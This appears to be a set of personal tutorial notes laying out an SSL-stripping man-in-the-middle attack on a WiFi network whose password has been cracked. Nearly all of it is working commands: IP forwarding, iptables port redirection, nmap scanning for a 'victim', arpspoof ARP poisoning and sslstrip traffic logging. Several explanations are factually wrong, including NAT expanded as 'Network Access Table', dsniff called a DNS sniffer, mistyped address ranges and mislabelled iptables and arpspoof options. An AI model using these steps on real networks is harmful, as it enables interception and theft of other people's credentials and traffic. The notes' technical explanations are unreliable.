1. SSL is Secure Socket Layer
2. ARP : Address Resolution Protocol
3. SSL Stripping :
    - Once WiFi password is cracked, you will be able to see all the network traffic going through that router.
    - But that data is encrypted because of HTTPS Protocol, hence of no use.
    - SSL Stripping is converting HTTPS request to HTTP request
4. `apt-get install sslstrip` : For ssl Stripping
5. `apt-get install dsniff` : For DNS sniffing
6. Stripping:
    - `echo 1 > /proc/sys/net/ipv4/ip_forward` : It enables the interface to allow forwarding network traffice from one port to another.
                                     To reset to changes, replace '1' with '0'
    - `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
        - '-t nat' : -t is flage for specifying table, here we are using nat - Network Access Table
        - '-A PREROUTING' : -A is flag to append an entry for PREROUTING
        - '-p tcp' : Which Protocol Layer
        - '--destination-port 80' : destination port for all the tcp traffic
        - '-j REDIRECT --to-port 8080' : '-j' indicates the execution command. REDIRECT will redirect all the traffic to port 8080
    - Verify if the redirection is added to iptables
        - `iptables -t nat -L PREROUTING` : List all the entries for PREROUTING in nat
    - `iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT` : Opens the port 8080 for port forwarding
        - '-I INPUT 1' : Insert the rule at number 1 (any conflicting rules are discarded, hence first rule is the active one)
        - '-p tcp --dport 8080 -j ACCEPT' : Accept request from 8080 port over tcp Protocol
    - Verify if the port rule is added to iptables
        - `iptables -L INPUT` : List all the entries for PREROUTING in nat
7. Scanning : To get the IP of target (or victim) device
    - `ifconfig en0` : Look for Get gateway IP of the router.
        - If your 'inet' show 192.168.1.123, then probably your router IP is 198.168.1.1
        - It means, available IPs for router is from 198.168.1.2 to 198.168.1.254
        - Another way is to run `route` command
    - `nmap 192.168.1.2-254` : scans all the IP between 198.168.1.2 and 198.168.1.254
        - It will show all the hosts that are up along with the open ports
8. Spoofing
    - `arpspoof -i en0 -t 192.168.1.1  -r 192.168.1.121`
        - '-i en0' : Network interface to use
        - '-t 192.168.1.1' : Gateway of teh router
        - '-r 192.168.1.121' : IP address of the victim device (Scanned using nmap)
9. Start listening:
    - `sslstrip -l 8080` : Start ssl stripping over port 8080
    - On another terminal, run `tail -f sslstrip.log` : It will display any realtime changes on sslstrip.log
